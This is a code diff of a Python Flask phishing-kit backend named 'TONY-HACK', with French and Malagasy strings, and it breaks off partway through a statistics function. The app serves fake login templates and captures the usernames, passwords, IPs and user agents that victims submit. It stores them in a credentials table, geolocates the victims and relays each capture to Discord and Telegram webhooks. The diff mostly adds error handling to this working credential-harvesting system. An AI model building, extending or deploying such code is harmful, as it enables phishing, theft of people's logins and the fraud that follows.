@@ -19,13 +19,9 @@ import requests
 import re
 import time
 
-# PostgreSQL
-try:
-    import psycopg2
-    from psycopg2.extras import RealDictCursor
-except ImportError:
-    import psycopg2cffi as psycopg2
-    from psycopg2cffi.extras import RealDictCursor
+# PostgreSQL - Version compatible Python 3.14
+import psycopg2
+from psycopg2.extras import RealDictCursor
 
 # =====================================================
 # CONFIGURATION
@@ -45,58 +41,61 @@ def get_db():
     return psycopg2.connect(DATABASE_URL, cursor_factory=RealDictCursor)
 
 def init_db():
-    with get_db() as conn:
-        with conn.cursor() as cur:
-            cur.execute('''
-                CREATE TABLE IF NOT EXISTS templates (
-                    id TEXT PRIMARY KEY,
-                    name TEXT,
-                    type TEXT,
-                    active BOOLEAN DEFAULT TRUE,
-                    color TEXT DEFAULT '#e94560',
-                    html_content TEXT,
-                    created_at TIMESTAMP DEFAULT NOW()
-                )
-            ''')
-            cur.execute('''
-                CREATE TABLE IF NOT EXISTS credentials (
-                    id TEXT PRIMARY KEY,
-                    template_id TEXT,
-                    username TEXT,
-                    password TEXT,
-                    ip TEXT,
-                    user_agent TEXT,
-                    target TEXT,
-                    timestamp TIMESTAMP DEFAULT NOW()
-                )
-            ''')
-            cur.execute('''
-                CREATE TABLE IF NOT EXISTS settings (
-                    key TEXT PRIMARY KEY,
-                    value TEXT
-                )
-            ''')
-            cur.execute('''
-                CREATE TABLE IF NOT EXISTS webhooks (
-                    id SERIAL PRIMARY KEY,
-                    service TEXT,
-                    url TEXT,
-                    token TEXT,
-                    chat_id TEXT,
-                    name TEXT,
-                    active BOOLEAN DEFAULT TRUE
-                )
-            ''')
-            cur.execute('''
-                CREATE TABLE IF NOT EXISTS campaign_stats (
-                    id SERIAL PRIMARY KEY,
-                    sent INTEGER DEFAULT 0,
-                    success INTEGER DEFAULT 0,
-                    failed INTEGER DEFAULT 0,
-                    history JSONB DEFAULT '[]'
-                )
-            ''')
-            conn.commit()
+    try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                cur.execute('''
+                    CREATE TABLE IF NOT EXISTS templates (
+                        id TEXT PRIMARY KEY,
+                        name TEXT,
+                        type TEXT,
+                        active BOOLEAN DEFAULT TRUE,
+                        color TEXT DEFAULT '#e94560',
+                        html_content TEXT,
+                        created_at TIMESTAMP DEFAULT NOW()
+                    )
+                ''')
+                cur.execute('''
+                    CREATE TABLE IF NOT EXISTS credentials (
+                        id TEXT PRIMARY KEY,
+                        template_id TEXT,
+                        username TEXT,
+                        password TEXT,
+                        ip TEXT,
+                        user_agent TEXT,
+                        target TEXT,
+                        timestamp TIMESTAMP DEFAULT NOW()
+                    )
+                ''')
+                cur.execute('''
+                    CREATE TABLE IF NOT EXISTS settings (
+                        key TEXT PRIMARY KEY,
+                        value TEXT
+                    )
+                ''')
+                cur.execute('''
+                    CREATE TABLE IF NOT EXISTS webhooks (
+                        id SERIAL PRIMARY KEY,
+                        service TEXT,
+                        url TEXT,
+                        token TEXT,
+                        chat_id TEXT,
+                        name TEXT,
+                        active BOOLEAN DEFAULT TRUE
+                    )
+                ''')
+                cur.execute('''
+                    CREATE TABLE IF NOT EXISTS campaign_stats (
+                        id SERIAL PRIMARY KEY,
+                        sent INTEGER DEFAULT 0,
+                        success INTEGER DEFAULT 0,
+                        failed INTEGER DEFAULT 0,
+                        history JSONB DEFAULT '[]'
+                    )
+                ''')
+                conn.commit()
+    except Exception as e:
+        print(f"DB Init Error: {e}")
 
 init_db()
 
@@ -132,17 +131,19 @@ geo_locator = GeoLocator()
 
 class WebhookManager:
     def __init__(self):
+        self.webhooks = {'discord': [], 'telegram': []}
         self.load()
     def load(self):
-        with get_db() as conn:
-            with conn.cursor() as cur:
-                cur.execute("SELECT * FROM webhooks")
-                self.webhooks = {'discord': [], 'telegram': []}
-                for w in cur.fetchall():
-                    if w['service'] == 'discord':
-                        self.webhooks['discord'].append({'id': w['id'], 'url': w['url'], 'name': w['name'], 'active': w['active']})
-                    elif w['service'] == 'telegram':
-                        self.webhooks['telegram'].append({'id': w['id'], 'token': w['token'], 'chat_id': w['chat_id'], 'name': w['name'], 'active': w['active']})
+        try:
+            with get_db() as conn:
+                with conn.cursor() as cur:
+                    cur.execute("SELECT * FROM webhooks")
+                    for w in cur.fetchall():
+                        if w['service'] == 'discord':
+                            self.webhooks['discord'].append({'id': w['id'], 'url': w['url'], 'name': w['name'], 'active': w['active']})
+                        elif w['service'] == 'telegram':
+                            self.webhooks['telegram'].append({'id': w['id'], 'token': w['token'], 'chat_id': w['chat_id'], 'name': w['name'], 'active': w['active']})
+        except: pass
     def add_discord(self, url, name="Discord"):
         with get_db() as conn:
             with conn.cursor() as cur:
@@ -173,14 +174,12 @@ class WebhookManager:
             if fields: embed["fields"] = fields
             r = requests.post(url, json={"embeds": [embed]}, timeout=5)
             return r.status_code == 204
-        except:
-            return False
+        except: return False
     def send_telegram(self, token, chat_id, msg):
         try:
             r = requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={"chat_id": chat_id, "text": msg, "parse_mode": "HTML"}, timeout=5)
             return r.json().get('ok', False)
-        except:
-            return False
+        except: return False
     def notify(self, template, username, password, ip, location="🌍 Unknown"):
         for w in self.webhooks['discord']:
             if w['active']:
@@ -284,14 +283,16 @@ def shorten_url():
 
 @app.route('/api/templates/list')
 def api_templates_list():
-    with get_db() as conn:
-        with conn.cursor() as cur:
-            cur.execute("SELECT id, name, type, active, color FROM templates ORDER BY active DESC, name")
-            templates = cur.fetchall()
-    base_url = request.host_url.rstrip('/')
-    for t in templates:
-        t['url'] = f"{base_url}/t/{t['id']}"
-    return jsonify(templates)
+    try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                cur.execute("SELECT id, name, type, active, color FROM templates ORDER BY active DESC, name")
+                templates = cur.fetchall()
+        base_url = request.host_url.rstrip('/')
+        for t in templates:
+            t['url'] = f"{base_url}/t/{t['id']}"
+        return jsonify(templates)
+    except: return jsonify([])
 
 @app.route('/api/templates/upload', methods=['POST'])
 def upload_template():
@@ -347,19 +348,15 @@ def delete_template(tid):
 
 @app.route('/t/<tid>')
 def serve_template(tid):
-    with get_db() as conn:
-        with conn.cursor() as cur:
-            cur.execute("SELECT html_content, active FROM templates WHERE id = %s", (tid,))
-            t = cur.fetchone()
-    if not t: return "Template introuvable", 404
-    if not t['active']: return "Template désactivé", 403
-    
-    ref = request.args.get('ref', '')
-    if ref:
-        try: print(f"[TRACKING] {tid} - {base64.b64decode(ref).decode('utf-8')}")
-        except: pass
-    
-    return t['html_content']
+    try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                cur.execute("SELECT html_content, active FROM templates WHERE id = %s", (tid,))
+                t = cur.fetchone()
+        if not t: return "Template introuvable", 404
+        if not t['active']: return "Template désactivé", 403
+        return t['html_content']
+    except: return "Erreur serveur", 500
 
 # =====================================================
 # API BUILDER
@@ -403,15 +400,15 @@ def capture():
     username = d.get('email') or d.get('username') or ''
     password = d.get('pass') or d.get('password') or ''
     
-    with get_db() as conn:
-        with conn.cursor() as cur:
-            cur.execute(
-                "INSERT INTO credentials (id, template_id, username, password, ip, user_agent, target) VALUES (%s, %s, %s, %s, %s, %s, %s)",
-                (cred_id, template_id, username, password, ip, ua, target)
-            )
-            conn.commit()
-    
     try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                cur.execute(
+                    "INSERT INTO credentials (id, template_id, username, password, ip, user_agent, target) VALUES (%s, %s, %s, %s, %s, %s, %s)",
+                    (cred_id, template_id, username, password, ip, ua, target)
+                )
+                conn.commit()
+        
         loc = geo_locator.locate(ip)
         location = geo_locator.format_location(loc)
         with get_db() as conn:
@@ -426,24 +423,26 @@ def capture():
 
 @app.route('/api/logs/list')
 def api_logs_list():
-    with get_db() as conn:
-        with conn.cursor() as cur:
-            cur.execute("""
-                SELECT c.*, t.name as template_name 
-                FROM credentials c 
-                LEFT JOIN templates t ON c.template_id = t.id 
-                ORDER BY c.timestamp DESC
-            """)
-            logs = cur.fetchall()
-    
-    for log in logs:
-        try:
-            loc = geo_locator.locate(log['ip'])
-            log['location'] = geo_locator.format_location(loc)
-        except:
-            log['location'] = "🌍 Unknown"
-    
-    return jsonify(logs)
+    try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                cur.execute("""
+                    SELECT c.*, t.name as template_name 
+                    FROM credentials c 
+                    LEFT JOIN templates t ON c.template_id = t.id 
+                    ORDER BY c.timestamp DESC
+                """)
+                logs = cur.fetchall()
+        
+        for log in logs:
+            try:
+                loc = geo_locator.locate(log['ip'])
+                log['location'] = geo_locator.format_location(loc)
+            except:
+                log['location'] = "🌍 Unknown"
+        
+        return jsonify(logs)
+    except: return jsonify([])
 
 @app.route('/api/logs/clear', methods=['POST'])
 def clear_logs():
@@ -457,15 +456,16 @@ def clear_logs():
 @app.route('/api/logs/export/pdf')
 def export_logs_pdf():
     if 'user' not in session: return redirect(url_for('login'))
-    with get_db() as conn:
-        with conn.cursor() as cur:
-            cur.execute("SELECT * FROM credentials ORDER BY timestamp DESC LIMIT 100")
-            logs = cur.fetchall()
-    
-    txt = "TONY-HACK - RAPPORT\n" + "="*50 + "\n"
-    for c in logs:
-        txt += f"{c['username']} | {c['ip']} | {c['timestamp']}\n"
-    return Response(txt, mimetype="text/plain", headers={"Content-disposition": "attachment; filename=rapport.txt"})
+    try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                cur.execute("SELECT * FROM credentials ORDER BY timestamp DESC LIMIT 100")
+                logs = cur.fetchall()
+        txt = "TONY-HACK - RAPPORT\n" + "="*50 + "\n"
+        for c in logs:
+            txt += f"{c['username']} | {c['ip']} | {c['timestamp']}\n"
+        return Response(txt, mimetype="text/plain", headers={"Content-disposition": "attachment; filename=rapport.txt"})
+    except: return "Erreur", 500
 
 # =====================================================
 # API STATISTIQUES AVANCÉES
@@ -474,142 +474,38 @@ def export_logs_pdf():
 @app.route('/api/statistics/advanced')
 def api_statistics_advanced():
     if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
-    
-    with get_db() as conn:
-        with conn.cursor() as cur:
-            cur.execute("SELECT * FROM credentials")
-            creds = cur.fetchall()
-    
-    countries = {}
-    browsers = {}
-    os_data = {}
-    hourly = {str(h).zfill(2): 0 for h in range(24)}
-    
-    for c in creds:
-        ip = c['ip']
-        if ip and ip != '127.0.0.1':
-            loc = geo_locator.locate(ip)
-            country = loc.get('country', 'Unknown')
-            countries[country] = countries.get(country, 0) + 1
+    try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                cur.execute("SELECT * FROM credentials")
+                creds = cur.fetchall()
         
-        ua = c.get('user_agent', '')
-        if ua:
-            if 'Chrome' in ua and 'Edg' not in ua: browser = 'Chrome'
-            elif 'Firefox' in ua: browser = 'Firefox'
-            elif 'Safari' in ua and 'Chrome' not in ua: browser = 'Safari'
-            elif 'Edg' in ua: browser = 'Edge'
-            else: browser = 'Autre'
-            browsers[browser] = browsers.get(browser, 0) + 1
+        countries = {}
+        browsers = {}
+        os_data = {}
+        hourly = {str(h).zfill(2): 0 for h in range(24)}
+        
+        for c in creds:
+            ip = c['ip']
+            if ip and ip != '127.0.0.1':
+                loc = geo_locator.locate(ip)
+                country = loc.get('country', 'Unknown')
+                countries[country] = countries.get(country, 0) + 1
             
-            if 'Windows' in ua: os_name = 'Windows'
-            elif 'Mac' in ua: os_name = 'macOS'
-            elif 'Android' in ua: os_name = 'Android'
-            elif 'iPhone' in ua or 'iPad' in ua: os_name = 'iOS'
-            else: os_name = 'Autre'
-            os_data[os_name] = os_data.get(os_name, 0) + 1
-        
-        ts = c.get('timestamp')
-        if ts:
-            try: hourly[str(ts.hour).zfill(2)] += 1
-            except: pass
-    
-    sorted_countries = sorted(countries.items(), key=lambda x: x[1], reverse=True)[:10]
-    
-    return jsonify({
-        'countries': [{'name': c[0], 'count': c[1]} for c in sorted_countries],
-        'browsers': [{'name': b, 'count': c} for b, c in browsers.items()],
-        'os': [{'name': o, 'count': c} for o, c in os_data.items()],
-        'hourly': {'labels': [f"{h}h" for h in range(24)], 'data': [hourly[str(h).zfill(2)] for h in range(24)]},
-        'total': len(creds)
-    })
-
-# =====================================================
-# API STATS GLOBALES
-# =====================================================
-
-@app.route('/api/stats')
-def api_stats():
-    with get_db() as conn:
-        with conn.cursor() as cur:
-            cur.execute("SELECT COUNT(*) as templates FROM templates WHERE active = TRUE")
-            templates = cur.fetchone()['templates']
-            cur.execute("SELECT COUNT(*) as credentials FROM credentials")
-            creds = cur.fetchone()['credentials']
-    return jsonify({'templates': templates, 'credentials': creds})
-
-# =====================================================
-# API PROFILE
-# =====================================================
-
-@app.route('/api/profile')
-def api_profile():
-    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
-    return jsonify({'username': session.get('user'), 'role': 'Super Admin'})
-
-# =====================================================
-# API WEBHOOKS
-# =====================================================
-
-@app.route('/api/webhooks', methods=['GET'])
-def api_get_webhooks():
-    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
-    return jsonify(webhook_manager.get_all())
-
-@app.route('/api/webhooks/discord', methods=['POST'])
-def api_add_discord():
-    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
-    d = request.get_json() or {}
-    if d.get('url'): webhook_manager.add_discord(d['url'], d.get('name', 'Discord')); return jsonify({'success': True})
-    return jsonify({'error': 'URL requise'}), 400
-
-@app.route('/api/webhooks/telegram', methods=['POST'])
-def api_add_telegram():
-    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
-    d = request.get_json() or {}
-    if d.get('token') and d.get('chat_id'): webhook_manager.add_telegram(d['token'], d['chat_id'], d.get('name', 'Telegram')); return jsonify({'success': True})
-    return jsonify({'error': 'Token sy Chat ID ilaina'}), 400
-
-@app.route('/api/webhooks/<service>/<int:id>', methods=['DELETE'])
-def api_remove_webhook(service, id):
-    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
-    webhook_manager.remove(service, id)
-    return jsonify({'success': True})
-
-@app.route('/api/webhooks/<service>/<int:id>/toggle', methods=['POST'])
-def api_toggle_webhook(service, id):
-    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
-    webhook_manager.toggle(service, id)
-    return jsonify({'success': True})
-
-@app.route('/api/webhooks/test', methods=['POST'])
-def api_test_webhook():
-    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
-    d = request.get_json() or {}; s = d.get('service')
-    if s == 'discord': ok = webhook_manager.send_discord(d.get('url'), "🧪 Test", "✅ Webhook Discord mandeha!")
-    elif s == 'telegram': ok = webhook_manager.send_telegram(d.get('token'), d.get('chat_id'), "🧪 <b>Test</b>\n\n✅ Webhook Telegram mandeha!")
-    else: return jsonify({'error': 'Service invalide'}), 400
-    return jsonify({'success': ok})
-
-# =====================================================
-# API SETTINGS
-# =====================================================
-
-@app.route('/api/settings', methods=['POST'])
-def save_settings():
-    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
-    d = request.get_json() or {}
-    with get_db() as conn:
-        with conn.cursor() as cur:
-            for k, v in d.items():
-                cur.execute("INSERT INTO settings (key, value) VALUES (%s, %s) ON CONFLICT (key) DO UPDATE SET value = %s", (k, v, v))
-            conn.commit()
-    return jsonify({'success': True})
-
-# =====================================================
-# DÉMARRAGE
-# =====================================================
-
-if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    print(f"\n🔴 TONY-HACK v5.0 - RENDER READY")
-    app.run(host='0.0.0.0', port=port, debug=False)
+            ua = c.get('user_agent', '')
+            if ua:
+                if 'Chrome' in ua and 'Edg' not in ua: browser = 'Chrome'
+                elif 'Firefox' in ua: browser = 'Firefox'
+                elif 'Safari' in ua and 'Chrome' not in ua: browser = 'Safari'
+                elif 'Edg' in ua: browser = 'Edge'
+                else: browser = 'Autre'
+                browsers[browser] = browsers.get(browser, 0) + 1
+                
+                if 'Windows' in ua: os_name = 'Windows'
+                elif 'Mac' in ua: os_name = 'macOS'
+                elif 'Android' in ua: os_name = 'Android'
+                elif 'iPhone' in ua or 'iPad' in ua: os_name = 'iOS'
+                else: os_name = 'Autre'
+                os_data[os_name] = os_data.get(os_name, 0) + 1
+            
+            ts = c.get('timestamp')
